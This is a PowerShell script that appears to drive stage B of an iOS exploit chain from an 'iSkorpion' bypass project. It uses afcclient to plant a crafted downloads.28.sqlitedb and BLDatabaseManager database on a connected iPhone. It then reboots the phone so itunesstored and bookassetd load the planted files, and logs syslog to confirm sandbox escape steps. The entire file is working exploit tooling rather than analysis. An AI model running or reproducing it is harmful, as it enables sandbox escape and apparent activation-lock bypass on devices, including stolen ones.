# Phase B runner: push the local stage-1 sources, plant the crafted download
# database, reboot so itunesstored/bookassetd re-read it, and capture the log.
#
# What the log/AFC should show afterwards:
#   /SBX-HTTP-A.txt  -> network usable + write into Media works
#   /SBX-FILE-A.txt  -> file:// URLs accepted by the download engine
#   iTunesMetadata.plist in /iTunes_Control/iTunes -> stage-1 metadata side
#   any "Documents/BLDownloads" path in the log -> the real bookassetd group id

$ErrorActionPreference = 'Continue'
$UDID = '00008030-001C499814C0802E'
$AFC = 'E:\bypass\iSkorpion-Bypass-Source-Code-main\Runtime\x64\afcclient.exe'
$SYSLOG = 'E:\bypass\iSkorpion-Bypass-Source-Code-main\Runtime\x64\idevicesyslog.exe'
$SBX = 'E:\bypass\work\sbx'
$LOG = 'E:\bypass\work\live\phaseB.log'
$ERR = 'E:\bypass\work\live\phaseB.err'

Remove-Item $LOG, $ERR -ErrorAction SilentlyContinue

Write-Host "== remove artefacts from the previous round =="
foreach ($f in @('/SBX-STAGE2-PLIST.plist', '/SBX-DST-A.txt', '/SBX-DST-B.txt',
                 '/SBX-GESTALT-DUMP.plist', '/SBX-STAGE2-PROOF.txt', '/SBX-STAGE2-ASSET.epub')) {
    & $AFC -u $UDID rm $f 2>&1 | Out-Null
}

Write-Host "== upload device-local sources for the file:// probes =="
& $AFC -u $UDID put "$SBX\SBX-HTTP.txt" /SBX-HTTP.txt 2>&1 | Out-String -Width 120
& $AFC -u $UDID put "$SBX\crafted-BLDatabaseManager.sqlite" /SBX-BL.sqlite 2>&1 | Out-String -Width 120
& $AFC -u $UDID put "$SBX\SBX-PROOF.epub" /SBX-PROOF.epub 2>&1 | Out-String -Width 120
& $AFC -u $UDID put "$SBX\SBX-ITUNESMETA.plist" /SBX-ITUNESMETA.plist 2>&1 | Out-String -Width 120

Write-Host "== plant the crafted download database =="
& $AFC -u $UDID rm /Downloads/downloads.28.sqlitedb 2>&1 | Out-Null
& $AFC -u $UDID rm /Downloads/downloads.28.sqlitedb-wal 2>&1 | Out-Null
& $AFC -u $UDID rm /Downloads/downloads.28.sqlitedb-shm 2>&1 | Out-Null
& $AFC -u $UDID put "$SBX\crafted-downloads.28.sqlitedb" /Downloads/downloads.28.sqlitedb 2>&1 | Out-String -Width 120

Remove-Item 'E:\bypass\work\live\verifyB.sqlitedb' -ErrorAction SilentlyContinue
& $AFC -u $UDID get /Downloads/downloads.28.sqlitedb 'E:\bypass\work\live\verifyB.sqlitedb' 2>&1 | Out-Null
Write-Host ("device copy sha1 : " + (Get-FileHash -Algorithm SHA1 'E:\bypass\work\live\verifyB.sqlitedb').Hash)
Write-Host ("crafted copy sha1: " + (Get-FileHash -Algorithm SHA1 "$SBX\crafted-downloads.28.sqlitedb").Hash)

Write-Host "== capture syslog across the reboot =="
$end = (Get-Date).AddSeconds(330)
$rebootAt = (Get-Date).AddSeconds(12)
$rebooted = $false
while ((Get-Date) -lt $end) {
    if (-not $rebooted -and (Get-Date) -gt $rebootAt) {
        $rebooted = $true
        Write-Host "== issuing restart =="
        python -m pymobiledevice3 diagnostics restart 2>&1 | Out-String -Width 120
    }
    & $SYSLOG -u $UDID *>> $LOG
    Start-Sleep -Seconds 3
}
Write-Host "capture stopped, size=$((Get-Item $LOG -ErrorAction SilentlyContinue).Length)"
